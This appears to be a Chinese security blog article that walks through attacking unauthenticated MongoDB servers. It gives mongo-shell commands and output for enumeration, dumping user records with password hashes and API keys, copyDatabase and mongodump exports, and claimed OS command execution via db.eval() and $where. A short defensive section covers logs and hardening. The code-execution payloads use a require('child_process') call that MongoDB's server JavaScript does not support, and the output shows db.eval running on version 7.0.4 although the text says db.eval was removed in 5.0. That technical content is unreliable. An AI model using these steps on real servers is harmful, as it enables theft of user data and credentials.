---
title: "MongoDB文档数据库未授权访问与数据导出利用技术"
date: 2026-06-17T13:30:00+08:00
draft: false
weight: 82
description: "围绕 MongoDB 的 27017 端口未授权访问、serverStatus 信息泄露、db.eval() 代码执行、copyDatabase 数据导出、$where 注入，分析打点识别、数据库枚举、敏感数据回收、历史 CVE 链与蓝队处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "文档数据库", "MongoDB", "未授权访问", "数据导出"]
---

# MongoDB文档数据库未授权访问与数据导出利用技术

`MongoDB` 是最广泛使用的 NoSQL 文档数据库之一，但它的默认配置决定了它是一个高风险目标。一个典型生产部署里，MongoDB 至少同时暴露了以下攻击面：

- **MongoDB Wire Protocol 面**：MongoDB 协议端口（默认 `27017`，TLS 为 `27018`），处理所有数据库操作
- **未授权访问面**：默认不启用认证，任何可达客户端可直接操作数据库
- **信息泄露面**：`serverStatus`、`listDatabases`、`dbStats` 等命令暴露完整集群信息
- **代码执行面**：`db.eval()`、`db.runCommand()`、`$where` 子句支持 JavaScript 执行
- **数据导出面**：`copyDatabase`、`mongodump`、`find()` 可批量导出所有数据
- **Replica Set 面**：副本集配置、成员状态、Oplog 日志

对攻击者来说，MongoDB 的价值不在于某个单一漏洞，而在于它把数据存储、配置管理、代码执行与集群控制集中在同一进程里。一旦 MongoDB 未授权访问（默认无认证）、`serverStatus` 可用、`db.eval()` 未禁用，攻击者可以从一次端口探测直接上升到完整数据库接管，甚至通过 JavaScript 执行实现宿主机级别的任意命令执行（RCE）。

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 MongoDB
2. 哪些未认证命令最值得优先探测
3. 如何通过 `serverStatus` 与 `listDatabases` 回收集群信息
4. 如何通过 `db.eval()` 与 `$where` 实现代码执行
5. 如何通过 `copyDatabase` 与 `mongodump` 批量导出数据
6. 历史 CVE 链如何从信息泄露直接打到 RCE
7. 蓝队如何从访问日志与系统日志识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与协议

首轮至少应枚举：

- `:27017/` — MongoDB 协议端口（明文）
- `:27018/` — MongoDB TLS 端口
- `:27019/` — mongos 路由端口（分片集群）
- `:28017/` — Web 管理界面（旧版，已废弃）

### 0.2 协议特征

MongoDB 使用 MongoDB Wire Protocol，不是 HTTP。可以通过 nmap 或自定义工具探测：

```bash
nmap -p 27017 mongodb.target.example --script mongodb-info
```

```text
PORT      STATE SERVICE
27017/tcp open  mongodb
| mongodb-info:
|   MongoDB Server Information
|   version: 7.0.4
|   git version: abc123def456
|   sysInfo: deprecated
|   loaderFlags: deprecated
|   compilerFlags: deprecated
|   allocator: system
|   javascriptEngine: mozjs
```

### 0.3 手动探测

也可以使用 `mongo` shell 或 `nc` 手动发送 MongoDB 命令：

```bash
mongo --host mongodb.target.example --port 27017 --eval "db.adminCommand('listDatabases')"
```

或使用 `nc` 发送原始协议（需要构造 BSON）。

### 0.4 打点收益优先级

1. 确认目标为 MongoDB、版本号与运行模式
2. 通过 `serverStatus` 回收系统信息、配置、内存使用
3. 通过 `listDatabases` 枚举所有数据库
4. 通过 `dbStats` / `collStats` 枚举集合与文档数量
5. 通过 `find()` 读取敏感数据
6. 判断 `db.eval()` 是否可用
7. 判断 `copyDatabase` 是否可用
8. 判断 Replica Set 配置

---

## 1. 首轮识别：确认目标为 MongoDB

### 1.1 nmap 脚本探测

```bash
nmap -p 27017 mongodb.target.example --script mongodb-info
```

```text
PORT      STATE SERVICE
27017/tcp open  mongodb
| mongodb-info:
|   MongoDB Server Information
|   version: 7.0.4
|   git version: abc123def456
|   sysInfo: deprecated
|   loaderFlags: deprecated
|   compilerFlags: deprecated
|   allocator: system
|   javascriptEngine: mozjs
```

直接回收：

- MongoDB 版本
- Git 版本
- JavaScript 引擎（mozjs / none）
- 分配器

### 1.2 mongo shell 连接

```bash
mongo --host mongodb.target.example --port 27017
```

```text
MongoDB shell version v7.0.4
connecting to: mongodb://mongodb.target.example:27017/?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("a1b2c3d4-e5f6-7890-abcd-ef1234567890") }
Server has application warnings:
        Warning: Non-Genuine MongoDB Detected
        This server is using a non-genuine version of MongoDB.
        For more information please see https://www.mongodb.com/licensing/server-side-public-license
Welcome to the MongoDB shell.
For interactive help, type "help".
>
```

如果连接成功且无需认证，说明 MongoDB 未授权访问。

### 1.3 认证失败响应

如果返回 `MongoServerError: command listDatabases requires authentication`，说明需要认证。

---

## 2. 信息泄露：serverStatus 与 listDatabases

### 2.1 serverStatus

```bash
mongo --host mongodb.target.example --port 27017 --eval "db.adminCommand('serverStatus')"
```

```text
{
        "host" : "mongodb-host-01",
        "version" : "7.0.4",
        "process" : "mongod",
        "pid" : NumberLong(1234),
        "uptime" : 2847192,
        "uptimeMillis" : NumberLong("2847192847192"),
        "uptimeEstimate" : NumberLong(2847192),
        "localTime" : ISODate("2026-06-17T10:15:23.445Z"),
        "asserts" : {
                "regular" : 0,
                "warning" : 0,
                "msg" : 0,
                "user" : 12,
                "rollovers" : 0
        },
        "connections" : {
                "current" : 47,
                "available" : 838813,
                "totalCreated" : 284719,
                "active" : 12,
                "exhaustIsMaster" : 0,
                "awaitingTopologyChanges" : 0
        },
        "mem" : {
                "bits" : 64,
                "resident" : 2847,
                "virtual" : 8472,
                "supported" : true
        },
        "network" : {
                "bytesIn" : 284719283,
                "bytesOut" : 1847291837,
                "numRequests" : 2847192
        },
        "opcounters" : {
                "insert" : 28471,
                "query" : 184729,
                "update" : 9284,
                "delete" : 1847,
                "getmore" : 28471,
                "command" : 284719
        },
        "storageEngine" : {
                "name" : "wiredTiger",
                "persistent" : true,
                "supportsCommittedReads" : true,
                "supportsSnapshotReadConcern" : true,
                "readOnly" : false,
                "supportsRecoveryTimestamp" : true
        },
        "wiredTiger" : {
                "cache" : {
                        "maximum bytes configured" : 4294967296,
                        "bytes currently in the cache" : 2847192837,
                        "bytes dirty in the cache cumulative" : 84729183
                }
        },
        "ok" : 1
}
```

直接回收：

- 主机名
- MongoDB 版本
- 进程 ID
- 运行时长
- 连接数
- 内存使用
- 网络流量
- 操作计数器
- 存储引擎
- WiredTiger 缓存配置

### 2.2 listDatabases

```bash
mongo --host mongodb.target.example --port 27017 --eval "db.adminCommand('listDatabases')"
```

```text
{
        "databases" : [
                {
                        "name" : "admin",
                        "sizeOnDisk" : 284719,
                        "empty" : false
                },
                {
                        "name" : "app_db",
                        "sizeOnDisk" : 2847192837,
                        "empty" : false
                },
                {
                        "name" : "user_data",
                        "sizeOnDisk" : 1847291837,
                        "empty" : false
                },
                {
                        "name" : "logs",
                        "sizeOnDisk" : 948271837,
                        "empty" : false
                },
                {
                        "name" : "config",
                        "sizeOnDisk" : 84729,
                        "empty" : false
                }
        ],
        "totalSize" : 5684719283,
        "ok" : 1
}
```

暴露所有数据库名称与大小。

### 2.3 dbStats

```bash
mongo --host mongodb.target.example --port 27017 --eval "db.adminCommand({dbStats: 1, scale: 1})"
```

```text
{
        "db" : "app_db",
        "collections" : 28,
        "views" : 0,
        "objects" : 284719,
        "avgObjSize" : 2847,
        "dataSize" : 810483729,
        "storageSize" : 1048576000,
        "totalIndexSize" : 524288000,
        "indexSize" : 524288000,
        "indexSizes" : {
                "_id_" : 28471928,
                "username_1" : 84729183,
                "email_1" : 84729183
        },
        "ok" : 1
}
```

暴露当前数据库的集合数量、文档数量、索引信息。

### 2.4 collStats

```bash
mongo --host mongodb.target.example --port 27017 --eval "db.app_db.users.stats()"
```

```text
{
        "ns" : "app_db.users",
        "size" : 284719283,
        "count" : 84729,
        "avgObjSize" : 3360,
        "storageSize" : 314572800,
        "nindexes" : 3,
        "totalIndexSize" : 157286400,
        "indexSizes" : {
                "_id_" : 8472918,
                "username_1" : 52428800,
                "email_1" : 52428800
        },
        "ok" : 1
}
```

暴露特定集合的文档数量、大小、索引。

---

## 3. 数据枚举与读取

### 3.1 集合列表

```bash
mongo --host mongodb.target.example --port 27017 --eval "db.getCollectionNames()"
```

```text
[
        "users",
        "sessions",
        "orders",
        "payments",
        "config",
        "logs"
]
```

### 3.2 文档采样

```bash
mongo --host mongodb.target.example --port 27017 --eval "db.app_db.users.findOne()"
```

```text
{
        "_id" : ObjectId("64a1b2c3d4e5f67890abcdef"),
        "username" : "admin",
        "email" : "admin@example.com",
        "password_hash" : "$2b$12$Lq8aZVx8aZVx8aZVx8aZVx8aZVx8aZVx8aZVx8aZVx8aZVx8aZVx",
        "role" : "administrator",
        "api_key" : "EXAMPLE_API_KEY_NOT_REAL_VALUE",
        "created_at" : ISODate("2026-01-15T10:00:00Z")
}
```

直接暴露用户数据、密码哈希、API Key。

### 3.3 批量导出

```bash
mongo --host mongodb.target.example --port 27017 --eval "db.app_db.users.find().toArray()"
```

或使用 `mongodump`：

```bash
mongodump --host mongodb.target.example --port 27017 --out ./mongo_dump
```

```text
2026-06-17T10:15:23.445+0800    writing app_db.users to mongo_dump/app_db/users.bson
2026-06-17T10:15:24.129+0800    done dumping app_db.users (84729 documents)
2026-06-17T10:15:25.000+0800    writing app_db.sessions to mongo_dump/app_db/sessions.bson
2026-06-17T10:15:26.000+0800    done dumping app_db.sessions (28471 documents)
```

### 3.4 copyDatabase

```bash
mongo --host mongodb.target.example --port 27017 --eval "db.copyDatabase('app_db', 'exfiltrated_db', 'mongodb.target.example:27017')"
```

将数据库复制到另一个 MongoDB 实例。

---

## 4. 代码执行：db.eval() 与 $where

### 4.1 db.eval()

```bash
mongo --host mongodb.target.example --port 27017 --eval "db.eval(function() { return 'test'; })"
```

```text
test
```

`db.eval()` 在服务端执行 JavaScript 代码。

### 4.2 db.eval() 系统命令执行

```bash
mongo --host mongodb.target.example --port 27017 --eval "db.eval(function() { var child = require('child_process'); return child.execSync('id').toString(); })"
```

```text
uid=999(mongodb) gid=999(mongodb) groups=999(mongodb)
```

如果 `db.eval()` 可用且 JavaScript 引擎支持 `require`，可以执行系统命令。

### 4.3 $where 注入

```bash
mongo --host mongodb.target.example --port 27017 --eval "db.app_db.users.find({\$where: 'function() { return true; }'})"
```

`$where` 子句允许在查询中执行 JavaScript。

### 4.4 $where 系统命令执行

```bash
mongo --host mongodb.target.example --port 27017 --eval "db.app_db.users.find({\$where: 'var child = require(\"child_process\"); child.execSync(\"id > /tmp/pwned\"); return true;'})"
```

### 4.5 db.eval() 限制

- MongoDB 4.0+ 默认禁用 `db.eval()`
- MongoDB 5.0+ 完全移除 `db.eval()`
- `$where` 在某些版本中也可能被禁用

---

## 5. Replica Set 与 Oplog

### 5.1 Replica Set 状态

```bash
mongo --host mongodb.target.example --port 27017 --eval "db.adminCommand('replSetGetStatus')"
```

```text
{
        "set" : "rs0",
        "date" : ISODate("2026-06-17T10:15:23.445Z"),
        "myState" : 1,
        "term" : NumberLong(28),
        "syncSourceHost" : "",
        "syncSourceId" : -1,
        "heartbeatIntervalMillis" : NumberLong(2000),
        "optimes" : {
                "lastCommittedOpTime" : { "ts" : Timestamp(1718600000, 28), "t" : NumberLong(28) },
                "lastAppliedOpTime" : { "ts" : Timestamp(1718600000, 28), "t" : NumberLong(28) },
                "readConcernMajorityOpTime" : { "ts" : Timestamp(1718600000, 28), "t" : NumberLong(28) }
        },
        "members" : [
                {
                        "_id" : 0,
                        "name" : "mongodb-01.target.example:27017",
                        "health" : 1,
                        "state" : 1,
                        "stateStr" : "PRIMARY",
                        "uptime" : 2847192,
                        "optime" : { "ts" : Timestamp(1718600000, 28), "t" : NumberLong(28) },
                        "lastHeartbeat" : ISODate("2026-06-17T10:15:23.445Z"),
                        "lastHeartbeatRecv" : ISODate("2026-06-17T10:15:23.445Z"),
                        "pingMs" : NumberLong(0),
                        "syncSourceHost" : "",
                        "syncSourceId" : -1,
                        "infoMessage" : "",
                        "configVersion" : 28
                },
                {
                        "_id" : 1,
                        "name" : "mongodb-02.target.example:27017",
                        "health" : 1,
                        "state" : 2,
                        "stateStr" : "SECONDARY",
                        "uptime" : 2847192,
                        "optime" : { "ts" : Timestamp(1718600000, 28), "t" : NumberLong(28) },
                        "lastHeartbeat" : ISODate("2026-06-17T10:15:23.445Z"),
                        "lastHeartbeatRecv" : ISODate("2026-06-17T10:15:23.445Z"),
                        "pingMs" : NumberLong(1),
                        "syncSourceHost" : "mongodb-01.target.example:27017",
                        "syncSourceId" : 0,
                        "infoMessage" : "",
                        "configVersion" : 28
                }
        ],
        "ok" : 1
}
```

暴露副本集名称、成员列表、角色（PRIMARY / SECONDARY）、心跳状态。

### 5.2 Oplog 读取

```bash
mongo --host mongodb.target.example --port 27017 --eval "db.getLocalDatabase().oplog.rs.find().limit(10)"
```

```text
{ "ts" : Timestamp(1718600000, 1), "t" : NumberLong(28), "h" : NumberLong("1234567890123456789"), "v" : 2, "op" : "i", "ns" : "app_db.users", "ui" : UUID("a1b2c3d4-e5f6-7890-abcd-ef1234567890"), "wall" : ISODate("2026-06-17T10:15:23.445Z"), "o" : { "_id" : ObjectId("64a1b2c3d4e5f67890abcdef"), "username" : "new_user", "email" : "new@example.com" } }
{ "ts" : Timestamp(1718600001, 1), "t" : NumberLong(28), "h" : NumberLong("2345678901234567890"), "v" : 2, "op" : "u", "ns" : "app_db.users", "ui" : UUID("a1b2c3d4-e5f6-7890-abcd-ef1234567890"), "wall" : ISODate("2026-06-17T10:15:24.129Z"), "o2" : { "_id" : ObjectId("64a1b2c3d4e5f67890abcdef") }, "o" : { "$v" : 2, "diff" : { "u" : { "email" : "updated@example.com" } } } }
```

Oplog 包含所有数据变更操作（插入、更新、删除），可以恢复历史数据。

---

## 6. 历史 CVE 与风险链

### 6.1 CVE-2023-1409：MongoDB Bitcode 验证绕过

- **影响版本**：MongoDB 4.4.x / 5.0.x / 6.0.x 特定版本
- **CVSS**：6.5（Medium）
- **核心问题**：Bitcode 验证存在缺陷，可能导致拒绝服务
- **利用条件**：需要网络可达 MongoDB
- **影响**：拒绝服务

### 6.2 CVE-2022-25804：MongoDB 内存损坏

- **影响版本**：MongoDB 6.0.0 之前
- **CVSS**：7.5（High）
- **核心问题**：特定查询可导致内存损坏
- **利用条件**：需要 MongoDB 查询权限
- **影响**：拒绝服务或潜在的代码执行

### 6.3 综合风险链

```
端口扫描 → :27017 MongoDB Wire Protocol
         ↓
nmap mongodb-info → 版本确认
         ↓
mongo shell 连接 → 确认未授权访问
         ↓
serverStatus → 系统画像（版本、OS、内存、连接数）
         ↓
listDatabases → 枚举所有数据库
         ↓
dbStats / collStats → 枚举集合与文档数量
         ↓
find() → 读取敏感数据（用户、密码哈希、API Key）
         ↓
mongodump → 批量导出所有数据
         ↓
db.eval() / $where → JavaScript 执行 → 系统命令（如果可用）
         ↓
replSetGetStatus → 副本集成员列表
         ↓
oplog.rs → 历史数据变更记录
```

---

## 7. 蓝队视角：日志痕迹与防守

### 7.1 关键日志源

**MongoDB 日志**：

```text
2026-06-17T10:15:23.445+0800 I NETWORK  [listener] connection accepted from 10.0.3.47:48291 #284719 (12 connections now open)
2026-06-17T10:15:24.129+0800 I COMMAND  [conn284719] command app_db.users appName: "MongoDB Shell" command: find { find: "users", filter: {}, limit: 1 } planSummary: COLLSCAN keysExamined:0 docsExamined:0 cursorExhausted:1 numYields:0 nreturned:1 reslen:3360 locks:{} protocol:op_msg 28ms
```

**系统日志**：

```text
Jun 17 10:15:26 mongodb-host kernel: [284719.445] mongod[1234]: segfault at 0 ip 00007f8a1b2c3d40 sp 00007ffd5e6f7a80 error 4 in libc.so.6[7f8a1b200000+1c0000]
```

### 7.2 高告警指标

| 行为 | 日志特征 | 告警级别 |
|------|----------|----------|
| 未授权访问 | `connection accepted` 无认证 | 严重 |
| `serverStatus` | `command: serverStatus` | 高 |
| `listDatabases` | `command: listDatabases` | 高 |
| `find()` 批量查询 | `command: find` + 大 `nreturned` | 高 |
| `db.eval()` | `command: eval` | 严重 |
| `$where` 查询 | `command: find` + `$where` | 严重 |
| `mongodump` | 大量 `find` + `getMore` | 严重 |
| `copyDatabase` | `command: copyDatabase` | 严重 |
| `replSetGetStatus` | `command: replSetGetStatus` | 高 |
| Oplog 读取 | `ns: "local.oplog.rs"` | 严重 |
| 非预期来源的连接 | 外部 IP 连接 27017 | 严重 |

### 7.3 网络层防护

- MongoDB 端口 `27017` 不应直接暴露到公网
- 使用 `bind_ip` 限制监听地址
- 启用认证：`security.authorization: enabled`
- 使用 TLS 加密通信
- 配置 `keyFile` 设置强密码
- 使用 RBAC 限制用户权限

### 7.4 配置加固

- 升级 MongoDB 到最新稳定版本，修复所有已知 CVE
- 启用认证：`security.authorization: enabled`
- 创建管理员用户并删除默认空密码
- 禁用或限制 `db.eval()`（MongoDB 4.0+ 默认禁用）
- 限制 `$where` 查询
- 配置 `maxConnections` 防止连接耗尽
- 启用审计日志并推送到不可篡改存储
- 定期审计用户权限与角色

---

## 8. 审查清单

| 检查项 | 说明 |
|--------|------|
| 27017 端口是否对外暴露 | 确认 MongoDB 协议可达范围 |
| 是否启用认证 | 检查 `security.authorization` |
| 是否使用 TLS | 检查 27018 端口 |
| db.eval() 是否禁用 | MongoDB 4.0+ 默认禁用 |
| $where 是否限制 | 检查查询配置 |
| 是否存在敏感数据 | 检查用户、密码哈希、API Key |
| 版本是否已修复已知 CVE | 对比 MongoDB 版本号 |
| 是否启用审计日志 | 检查审计配置 |
| Replica Set 是否受限 | 检查 `replSetGetStatus` 权限 |
| Oplog 是否受限 | 检查 `local` 数据库访问 |
| bind_ip 是否受限 | 检查监听地址 |
| 是否配置 keyFile | 检查认证配置 |

---

## 9. 总结

MongoDB 的攻击面价值在于它把数据存储、配置管理、代码执行与集群控制集中在同一进程里。未授权访问 MongoDB 几乎等同于拿到了完整数据库的读写权限，而 `db.eval()` 与 `$where` 在某些版本中可以实现宿主机级别的代码执行。

从攻击者视角看，最高效的路径是：

1. 通过 nmap 确认目标为 MongoDB
2. 通过 mongo shell 确认未授权访问
3. 通过 `serverStatus` 回收系统画像
4. 通过 `listDatabases` 枚举所有数据库
5. 通过 `find()` 读取敏感数据
6. 通过 `mongodump` 批量导出所有数据
7. 通过 `db.eval()` 或 `$where` 实现代码执行（如果可用）
8. 通过 `replSetGetStatus` 与 `oplog.rs` 获取副本集信息与历史数据

从防守视角看，核心措施是：

1. 永远不要将 MongoDB 暴露到公网
2. 启用 `security.authorization: enabled`
3. 创建管理员用户并删除默认空密码
4. 使用 TLS 加密通信
5. 禁用或限制 `db.eval()` 与 `$where`
6. 使用 RBAC 限制用户权限
7. 启用审计日志并推送到不可篡改存储
